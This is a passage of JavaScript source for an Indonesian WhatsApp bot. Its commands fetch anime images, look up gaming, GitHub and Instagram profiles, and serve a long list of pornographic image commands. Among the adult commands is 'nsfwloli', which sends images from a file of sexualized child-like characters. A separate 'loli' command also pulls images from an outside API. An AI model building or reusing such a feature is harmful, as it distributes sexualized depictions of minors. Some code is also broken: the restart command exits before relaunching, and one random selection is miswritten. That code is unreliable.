if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/lisa.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/mountain.json')
if (/narutouzumaki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/onepiece.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/pubg.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/satanic.json')
if (/shina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shina.json')
if (/shinka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shinka.json')
if (/shinomiya/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shinomiya.json')
if (/shizuka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shizuka.json')
if (/shota/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/shota.json')
if (/space/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tatasurya.json')
if (/technology/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/technology.json')
if (/tejina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tejina.json')
if (/toukachan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/toukachan.json')
if (/tsunade/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/tsunade.json')
if (/wallhp/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallhp.json')
if (/wallml/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallml.json')
if (/wallmlnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/wallnime.json')
if (/yotsuba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yotsuba.json')
if (/yuki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yuki.json')
if (/yulibocil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yulibocil.json')
if (/yumeko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Blawuken/NFSMedia/master/yumeko.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
hinata.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
} catch {
m.reply('kesalahan 🚫') 
}
}break
//=================================================//
case 'loli': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
try {
hinata.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${apikey}` } })
} catch {
m.reply('kesalahan 🚫') 
}
}break
//=================================================//
case 'ffstalk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh : ${prefix+command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*// ғʀᴇᴇ ғɪʀᴇ sᴛᴀʟᴋᴇʀ \\*

ɪᴅ : ${eeh.id}
ɴɪᴄᴋɴᴀᴍᴇ : ${eeh.nickname}`)
}break
//=================================================//
case 'mlstalk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh : ${prefix+command} 530793138|8129`)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*// ᴍᴏʙɪʟᴇ ʟᴇɢᴇɴᴅ sᴛᴀʟᴋᴇʀ \\*

ᴜsᴇʀɴᴀᴍᴇ : ${dat.userName}
ɪᴅ : ${q.split("|")[0]}
ɪᴅ ᴢᴏɴᴇ: ${q.split("|")[1]}`)
}break
//=================================================//
case 'npmstalk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh ${prefix+command} ytdl-core`)
eha = await npmstalk.npmstalk(q)
reply(`*// Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}break
//=================================================//
case 'ghstalk': case 'githubstalk':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh : ${prefix+command} Blawuken`)
aj = await githubstalk.githubstalk(`${q}`)
hinata.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*// Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Lokasi : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}break
//=================================================//
case 'igstalk': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args[0]) return reply(`Masukkan Nama Pengguna Instagram\n\n📌Contoh : ${prefix + command} anggit0817`)
try {
let res = await fg.igStalk(args[0])
let te = `
┌──「 ɪɴғᴏʀᴍᴀsɪ 」
ミ *✏️ɴᴀᴍᴀ:* ${res.name} 
ミ *📝ᴜsᴇʀɴᴀᴍᴇ:* ${res.username}
ミ *👥ᴘᴇɴɢɪᴋᴜᴛ:* ${res.followersH}
ミ *🫂ᴍᴇɴɢɪᴋᴜᴛɪ:* ${res.followingH}
ミ *🏝️ᴘᴏsᴛɪɴɢᴀɴ:* ${res.postsH}
ミ *📌ʙɪᴏ:* ${res.description}
ミ *🔗ʟɪɴᴋ* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
await hinata.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
} catch {
reply(`Tidak Dapat Mencari Informasi Tentang Akun *Instagram* Tersebut\n\nCoba Buka https://dumpor.com/v/usermae tanpa awalan *@*`)
}
}break
//=================================================//
case 'ahegao': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'cum': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'hentai': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'orgy': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'ass': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'eba': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'jahy': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'panties': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'asupan2': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/asupan-la.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'ero': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'manga': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'pussy': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'asupan': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/asupan.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, video: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'femdom': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'masturbation': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'tentacles': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'bdsm': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'foot': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'milf': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'thighs': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'blowjob': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'gangbang': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'neko': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
neko = await axios.get(`https://waifu.pics/api/sfw/neko`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: neko.data.url } }, { quoted: m })
}break
//=================================================//
case 'yuri': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'boobs': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/boobs.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'gifs': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var hinataresult = pickRandom(ahegaonsfw)
await hinata.sendMessage(m.chat, {video: hinataresult, gifPlayback:true }, {quoted:m}).catch(err => {
})
}break
//=================================================//
case 'zettai': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'cuckold': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'glasses': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'nsfwloli': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
var aheg = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var hinataresult = pickRandom(aheg)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hinataresult.url } }, { quoted: m })
}break
//=================================================//
case 'hentaivid': case 'hentaivideo': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
const { hentai } = require('./HinataBase/lib/hentai.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
hinata.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `Judul : ${result912.title}\nKategori : ${result912.category}\nTipe Anime : ${result912.type}\nTampilan : ${result912.views_count}\nSaham : ${result912.share_count}\nSumber : ${result912.link}\nUrl Media : ${result912.video_1}` }, { quoted: m })
}break
//=================================================//
case 'hneko' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
hinata.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
}break
//=================================================//
case 'nwaifu' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
}break
//=================================================//
case 'waifu' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
waifu = await axios.get(`https://waifu.pics/api/sfw/waifu`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url:waifu.data.url } }, { quoted: m })
}break
//=================================================//
case 'animespank': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`) 
await hinata.sendMessage(m.chat, { caption:`Ini dia!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
return('Error!')
})
}break
//=================================================//
case 'shinobu' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
shinobu = await axios.get(`https://waifu.pics/api/sfw/shinobu`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: shinobu.data.url } }, { quoted: m })
}break
//=================================================//
case 'bully' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
bully = await axios.get(`https://waifu.pics/api/sfw/bully`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: bully.data.url } }, { quoted: m })
}break
//=================================================//
case 'cuddle' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
cuddle = await axios.get(`https://waifu.pics/api/sfw/cuddle`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: cuddle.data.url } }, { quoted: m })
}break
//=================================================//
case 'cry' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
cry = await axios.get(`https://waifu.pics/api/sfw/cry`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: cry.data.url } }, { quoted: m })
}break
//=================================================//
case 'hug' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
hug = await axios.get(`https://waifu.pics/api/sfw/hug`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: hug.data.url } }, { quoted: m })
}break
//=================================================//
case 'awoo' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
awoo = await axios.get(`https://waifu.pics/api/sfw/awoo`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: awoo.data.url } }, { quoted: m })
}break
//=================================================//
case 'kiss' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
kiss = await axios.get(`https://waifu.pics/api/sfw/kiss`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: kiss.data.url } }, { quoted: m })
}break
//=================================================//
case 'lick' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
lick = await axios.get(`https://waifu.pics/api/sfw/lick`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: lick.data.url } }, { quoted: m })
}break
//=================================================//
case 'pat' : {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!m.isGroup) return hinatareplygrouponly()
if (!AntiNsfw) return hinatansfw()
pat = await axios.get(`https://waifu.pics/api/sfw/pat`) 
hinata.sendMessage(m.chat, { caption: mess.success, image: { url: pat.data.url } }, { quoted: m })
}break
//=================================================//
case 'support': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
reply(`📌 ɢʀᴜᴘ ᴡʜᴀᴛsᴀᴘᴘ :\n${global.gr}\n\n📌 ɢɪᴛʜᴜʙ :\n${global.github}\n\n📌 ɪɴsᴛᴀɢʀᴀᴍ :\n${global.instagram}\n\n📌 ᴛɪᴋᴛᴏᴋ :\n${global.tiktok}\n\n📌 ʏᴏᴜᴛᴜʙᴇ :\n${global.youtube}`)
}break
//=================================================//
case 'myip': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
if (m.isGroup) return hinatareplypribadi()
var http = require('http')
http.get({
'host': 'api.ipify.org',
'port': 80,
'path': '/'
}, function(resp) {
resp.on('data', function(ip) {
reply("🔎 Alamat IP publik saya adalah: " + ip)
})
})
}break
//=================================================//
case 'shutdown': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
m.reply(`ʙᴏᴛ ᴀᴋᴀɴ ᴅɪ ᴍᴀᴛɪᴋᴀɴ...`)
await sleep(3000)
process.exit()
}break
//=================================================//
case 'restart': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
reply(`ᴍᴇᴍᴜʟᴀɪ ᴜʟᴀɴɢ ʙᴏᴛ...`)
await sleep(3000)
process.exit()
exec("npm start", (error, stdout, stderr) => {
if (error) {
console.log(`error: ${error.message}`)
return
}
if (stderr) {
console.log(`stderr: ${stderr}`)
return
}
console.log(`stdout: ${stdout}`)
})
}break
//=================================================//
case 'listpc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
teks = `✦「🔮𝗗𝗔𝗙𝗧𝗔𝗥 𝗣𝗘𝗡𝗚𝗚𝗨𝗡𝗔🔮」✦\n\n`
for (let i of pengguna) {
teks += `👤𝗨𝘀𝗲𝗿 : @${i.split('@')[0]}\n💌𝗖𝗵𝗮𝘁 : https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
}
teks += `𝗝𝘂𝗺𝗹𝗮𝗵 : ${pengguna.length} orang`
hinata.sendTextWithMentions(m.chat, teks, m)
}break
//=================================================//
case 'listgc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isCreator) return hinatareplyowner()
let getGroups = await hinata.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
let teks = `✦✦「🗃️𝗗𝗔𝗙𝗧𝗔𝗥 𝗚𝗥𝗨𝗣🗃️」✦✦\n\n𝗝𝘂𝗺𝗹𝗮𝗵 : ${anu.length} grup\n\n`
for (let i of anu) {
let metadata = await hinata.groupMetadata(i)
